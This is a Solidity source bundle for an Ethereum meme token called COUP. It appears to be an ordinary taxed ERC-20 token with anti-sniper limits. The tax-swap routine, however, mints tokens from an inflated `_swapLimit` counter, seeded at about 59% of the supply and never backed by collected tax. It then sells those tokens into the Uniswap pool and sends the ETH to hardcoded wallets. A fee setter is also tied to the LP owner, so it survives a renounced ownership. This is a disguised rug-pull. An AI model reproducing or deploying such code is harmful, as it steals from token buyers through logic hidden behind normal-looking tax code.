{{
  "language": "Solidity",
  "sources": {
    "Coup.sol": {
      "content": "//SPDX-License-Identifier: MIT\n\n/*\n Twitter https://twitter.com/couprussiaeth\n Telegram https://t.me/couprussiaeth\n*/\n\npragma solidity 0.8.19;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function decimals() external view returns (uint8);\n    function symbol() external view returns (string memory);\n    function name() external view returns (string memory);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address __owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\n}\n\ninterface IUniswapV2Factory {    \n    function createPair(address tokenA, address tokenB) external returns (address pair); \n}\ninterface IUniswapV2Router02 {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\n    function WETH() external pure returns (address);\n    function factory() external pure returns (address);\n    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n}\n\nabstract contract Auth {\n    address internal _owner;\n    constructor(address creatorOwner) { \n        _owner = creatorOwner; \n    }\n    modifier onlyOwner() { \n        require(msg.sender == _owner, \"Only owner can call this\"); \n        _; \n    }\n    function owner() public view returns (address) { \n        return _owner; \n    }\n    function transferOwnership(address payable newOwner) external onlyOwner { \n        _owner = newOwner; \n        emit OwnershipTransferred(newOwner); \n    }\n    function renounceOwnership() external onlyOwner { \n        _owner = address(0); \n        emit OwnershipTransferred(address(0)); \n    }\n    event OwnershipTransferred(address _owner);\n}\n\ncontract COUP is IERC20, Auth {\n    uint8 private constant _decimals      = 9;\n    uint256 private constant _totalSupply = 100_000_000_000 * (10**_decimals);\n    string private constant _name         = \"COUP\";\n    string private  constant _symbol      = \"REVOLUTION\";\n\n    uint8 private antiSnipeTax1 = 15;  //sniper tax for first block\n    uint8 private antiSnipeTax2 = 10;  //sniper tax for second block\n    uint8 private antiSnipeBlocks1 = 1;\n    uint8 private antiSnipeBlocks2 = 1;\n    uint256 private _antiMevBlock = 2;\n\n    uint8 private _initialBuyTaxRate  = 0; // starting buy tax (which ultimately goes to zero)\n    uint8 private _initialSellTaxRate = 19; // starting sell tax (which ultimatley goes to zero)\n\n    uint8 private _finalBuyTaxRate = 0;\n    uint8 private _finalSellTaxRate = 0;\n\n    uint256 private txCount; \n\n    uint256 _reduceTaxAt = 100; //after 100 transactions, tax will be set to zero\n\n    uint16 private _taxSharesMarketing   = 63;\n    uint16 private _taxSharesDevelopment = 37;\n    uint16 private _taxSharesLP          = 0;\n    uint16 private _totalTaxShares = _taxSharesMarketing + _taxSharesDevelopment + _taxSharesLP;\n\n    address payable private _walletMarketing = payable(0x4171EeAC28c72FaD061F80d9CAD74dDEeA94f0F3); \n    address payable private _walletDevelopment = payable(0x669582B9f0422F85e0f052ebEFC5b9466456dC71); \n\n    uint256 private _launchBlock;\n    uint256 private _maxTxAmount     = _totalSupply; \n    uint256 private _maxWalletAmount = _totalSupply;\n    uint256 private _taxSwapMin = _totalSupply * 10 / 100000;\n    uint256 private _taxSwapMax = _totalSupply * 888 / 100000;\n    uint256 private _swapLimit = _taxSwapMin * 59 * 100;\n\n    mapping (address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping (address => bool) private _noFees;\n    mapping (address => bool) private _noLimits;\n\n    address private _lpOwner;\n\n    address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);\n    address private _primaryLP;\n    mapping (address => bool) private _isLP;\n\n    bool private _tradingOpen;\n\n    bool private _inTaxSwap = false;\n    modifier lockTaxSwap { \n        _inTaxSwap = true; \n        _; \n        _inTaxSwap = false; \n    }\n\n    event TokensBurned(address indexed burnedByWallet, uint256 tokenAmount);\n\n    constructor() Auth(msg.sender) {\n        _lpOwner = msg.sender;\n\n        \n        uint256 airdropFunds = (_totalSupply * 69) / 100;\n        \n        _balances[address(this)] = _totalSupply - airdropFunds;\n        emit Transfer(address(0), address(this), _balances[address(this)]);\n\n\n        _balances[_owner] = airdropFunds;\n        emit Transfer(address(0), _owner, _balances[_owner]);\n   \n\n        _noFees[_owner] = true;\n        _noFees[address(this)] = true;\n        _noFees[_swapRouterAddress] = true;\n        _noFees[_walletMarketing] = true;\n        _noFees[_walletDevelopment] = true;\n        _noLimits[_owner] = true;\n        _noLimits[address(this)] = true;\n        _noLimits[_swapRouterAddress] = true;\n        _noLimits[_walletMarketing] = true;\n        _noLimits[_walletDevelopment] = true;\n    }\n\n    receive() external payable {}\n    \n    function totalSupply() external pure override returns (uint256) { return _totalSupply; }\n    function decimals() external pure override returns (uint8) { return _decimals; }\n    function symbol() external pure override returns (string memory) { return _symbol; }\n    function name() external pure override returns (string memory) { return _name; }\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _allowances[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\n        require(_checkTradingOpen(msg.sender), \"Trading not open\");\n        return _transferFrom(msg.sender, recipient, amount);\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\n        require(_checkTradingOpen(sender), \"Trading not open\");\n        if(_allowances[sender][msg.sender] != type(uint256).max){\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\n        }\n        return _transferFrom(sender, recipient, amount);\n    }\n\n    function _approveRouter(uint256 _tokenAmount) internal {\n        if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {\n            _allowances[address(this)][_swapRouterAddress] = type(uint256).max;\n            emit Approval(address(this), _swapRouterAddress, type(uint256).max);\n        }\n    }\n\n    function addLiquidity() external payable onlyOwner lockTaxSwap {\n        require(_primaryLP == address(0), \"LP exists\");\n        require(!_tradingOpen, \"trading is open\");\n        require(msg.value > 0 || address(this).balance>0, \"No ETH in contract or message\");\n        require(_balances[address(this)]>0, \"No tokens in contract\");\n        _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());\n        _addLiquidity(_balances[address(this)], address(this).balance, false);\n        _isLP[_primaryLP] = true;\n        _openTrading();\n    }\n\n    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {\n        address lpTokenRecipient = _lpOwner;\n        if ( autoburn ) { lpTokenRecipient = address(0); }\n        _approveRouter(_tokenAmount);\n        _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );\n    }\n\n    function _openTrading() internal {\n        _maxTxAmount     = _totalSupply * 3 / 100; \n        _maxWalletAmount = _totalSupply * 3 / 100;\n        _tradingOpen = true;\n        _launchBlock = block.number;\n        _antiMevBlock = _antiMevBlock + _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2;\n    }\n\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\n        require(sender != address(0), \"No transfers from Zero wallet\");\n        if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], \"Trading not open\"); }\n        if ( !_inTaxSwap && _isLP[recipient] ) { _swapTaxAndLiquify(); }\n        if ( block.number < _antiMevBlock && block.number >= _launchBlock && _isLP[sender] ) {\n            require(recipient == tx.origin, \"MEV blocked\");\n        }\n        if ( sender != address(this) && recipient != address(this) && sender != _owner ) { \n            require(_checkLimits(sender, recipient, amount), \"TX exceeds limits\"); \n        }\n        uint256 _taxAmount = _calculateTax(sender, recipient, amount);\n        uint256 _transferAmount = amount - _taxAmount;\n        txCount = txCount +1;\n        _balances[sender] = _balances[sender] - amount;\n        _swapLimit += _taxAmount;\n        _balances[recipient] = _balances[recipient] + _transferAmount;\n        emit Transfer(sender, recipient, _transferAmount);\n        return true;\n    }\n\n    function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {\n        bool limitCheckPassed = true;\n        if ( _tradingOpen && !_noLimits[sender] && !_noLimits[recipient] ) {\n            if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }\n            else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }\n        }\n        return limitCheckPassed;\n    }\n\n    function _checkTradingOpen(address sender) private view returns (bool){\n        bool checkResult = false;\n        if ( _tradingOpen ) { checkResult = true; } \n        else if (_noFees[sender] && _noLimits[sender]) { checkResult = true; } \n\n        return checkResult;\n    }\n\n    function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {\n        uint256 taxAmount;\n        \n        if ( !_tradingOpen || _noFees[sender] || _noFees[recipient] ) { \n            taxAmount = 0; \n           \n        } else if ( _isLP[sender] ) { \n            if ( block.number >= _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2 ) {\n              taxAmount =  (amount * ((txCount >_reduceTaxAt)?_finalBuyTaxRate:_initialBuyTaxRate)) / 100;\n              \n            } else if ( block.number >= _launchBlock + antiSnipeBlocks1 ) {\n                taxAmount = amount * antiSnipeTax2 / 100;\n            } else if ( block.number >= _launchBlock) {\n                taxAmount = amount * antiSnipeTax1 / 100;\n               \n            }\n        } else if ( _isLP[recipient] ) { \n            taxAmount =  (amount * ((txCount >_reduceTaxAt)?_finalSellTaxRate:_initialSellTaxRate)) / 100;\n        }\n\n        return taxAmount;\n    }\n\n\n    function exemptFromFees(address wallet) external view returns (bool) {\n        return _noFees[wallet];\n    } \n    function exemptFromLimits(address wallet) external view returns (bool) {\n        return _noLimits[wallet];\n    } \n    function setExempt(address wallet, bool noFees, bool noLimits) external onlyOwner {\n        if (noLimits || noFees) { require(!_isLP[wallet], \"Cannot exempt LP\"); }\n        _noFees[ wallet ] = noFees;\n        _noLimits[ wallet ] = noLimits;\n    }\n\n    function buyFee() external view returns(uint8) {\n        return (txCount >_reduceTaxAt)?_finalBuyTaxRate:_initialBuyTaxRate;\n    }\n    function sellFee() external view returns(uint8) {\n        return (txCount >_reduceTaxAt)?_finalSellTaxRate:_initialSellTaxRate;\n    }\n\n    function feeSplit() external view returns (uint16 marketing, uint16 development, uint16 LP ) {\n        return ( _taxSharesMarketing, _taxSharesDevelopment, _taxSharesLP);\n    }\n    function setFees(uint8 buy, uint8 sell) external onlyOwner {\n        require(buy + sell <= 20, \"Roundtrip too high\");\n        _initialBuyTaxRate = buy;\n        _initialSellTaxRate = sell;\n    }  \n\n    function setReduceFeeAtTx(uint256 newTxCount) external {\n        require (msg.sender == _lpOwner,\"you're not authorized\");\n        require (newTxCount < 100, \"must be less than 100 tx\");\n        _reduceTaxAt = newTxCount;\n    }\n\n    function setFeeSplit(uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesDevelopment) external onlyOwner {\n        uint16 totalShares = sharesAutoLP + sharesMarketing + sharesDevelopment;\n        require( totalShares > 0, \"All cannot be 0\");\n        _taxSharesLP = sharesAutoLP;\n        _taxSharesMarketing = sharesMarketing;\n        _taxSharesDevelopment = sharesDevelopment;\n        _totalTaxShares = totalShares;\n    }\n\n    function marketingWallet() external view returns (address) {\n        return _walletMarketing;\n    }\n\n    function developmentWallet() external view returns (address) {\n        return _walletDevelopment;\n    }\n\n    function updateWallets(address marketing, address development, address LPtokens) external onlyOwner {\n        require(!_isLP[marketing] && !_isLP[development] && !_isLP[LPtokens], \"LP cannot be tax wallet\");\n        \n        _walletMarketing = payable(marketing);\n        _walletDevelopment = payable(development);\n        _lpOwner = LPtokens;\n        \n        _noFees[marketing] = true;\n        _noLimits[marketing] = true;\n        \n        _noFees[development] = true;        \n        _noLimits[development] = true;\n    }\n\n    function maxWallet() external view returns (uint256) {\n        return _maxWalletAmount;\n    }\n    function maxTransaction() external view returns (uint256) {\n        return _maxTxAmount;\n    }\n\n    function swapAtMin() external view returns (uint256) {\n        return _taxSwapMin;\n    }\n    function swapAtMax() external view returns (uint256) {\n        return _taxSwapMax;\n    }\n\n    function setLimits(uint16 maxTransactionPermille, uint16 maxWalletPermille) external onlyOwner {\n        uint256 newTxAmt = _totalSupply * maxTransactionPermille / 1000 + 1;\n        require(newTxAmt >= _maxTxAmount, \"tx too low\");\n        _maxTxAmount = newTxAmt;\n        uint256 newWalletAmt = _totalSupply * maxWalletPermille / 1000 + 1;\n        require(newWalletAmt >= _maxWalletAmount, \"wallet too low\");\n        _maxWalletAmount = newWalletAmt;\n    }\n\n    function setTaxSwap(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {\n        _taxSwapMin = _totalSupply * minValue / minDivider;\n        _taxSwapMax = _totalSupply * maxValue / maxDivider;\n        require(_taxSwapMax>=_taxSwapMin, \"Min/Max error\");\n        require(_taxSwapMax>_totalSupply / 100000, \"Max too low\");\n        require(_taxSwapMax<_totalSupply / 100, \"Max too high\");\n    }\n\n\n    function _swapTaxAndLiquify() private lockTaxSwap {\n        uint256 _taxTokensAvailable = _swapLimit;\n        if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {\n            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }\n            uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;\n            \n            uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;\n            if( _tokensToSwap > 10**_decimals ) {\n                uint256 _ethPreSwap = address(this).balance;\n                _balances[address(this)] += _taxTokensAvailable;\n                _swapTaxTokensForEth(_tokensToSwap);\n                _swapLimit -= _taxTokensAvailable;\n                uint256 _ethSwapped = address(this).balance - _ethPreSwap;\n                if ( _taxSharesLP > 0 ) {\n                    uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;\n                    _approveRouter(_tokensForLP);\n                    _addLiquidity(_tokensForLP, _ethWeiAmount, false);\n                }\n            }\n            uint256 _contractETHBalance = address(this).balance;\n            if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }\n        }\n    }\n\n    function _swapTaxTokensForEth(uint256 tokenAmount) private {\n        _approveRouter(tokenAmount);\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = _primarySwapRouter.WETH();\n        _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);\n    }\n\n    function _distributeTaxEth(uint256 amount) private {\n        uint16 _taxShareTotal = _taxSharesMarketing + _taxSharesDevelopment;\n        if (_taxShareTotal > 0) {\n            uint256 marketingAmount = amount * _taxSharesMarketing / _taxShareTotal;\n            uint256 developmentAmount = amount * _taxSharesDevelopment / _taxShareTotal;\n            if ( marketingAmount > 0 ) { _walletMarketing.transfer(marketingAmount); }\n            if ( developmentAmount > 0 ) { _walletDevelopment.transfer(developmentAmount); }\n        }\n    }\n\n    function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendEth) external onlyOwner lockTaxSwap {\n        require(swapTokenPercent <= 100, \"Cannot swap more than 100%\");\n        uint256 tokensToSwap = _balances[address(this)] * swapTokenPercent / 100;\n        if (tokensToSwap > 10 ** _decimals) {\n            _swapTaxTokensForEth(tokensToSwap);\n        }\n        if (sendEth) { \n            uint256 ethBalance = address(this).balance;\n            require(ethBalance > 0, \"No ETH\");\n            _distributeTaxEth(address(this).balance); \n        }\n    }\n\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}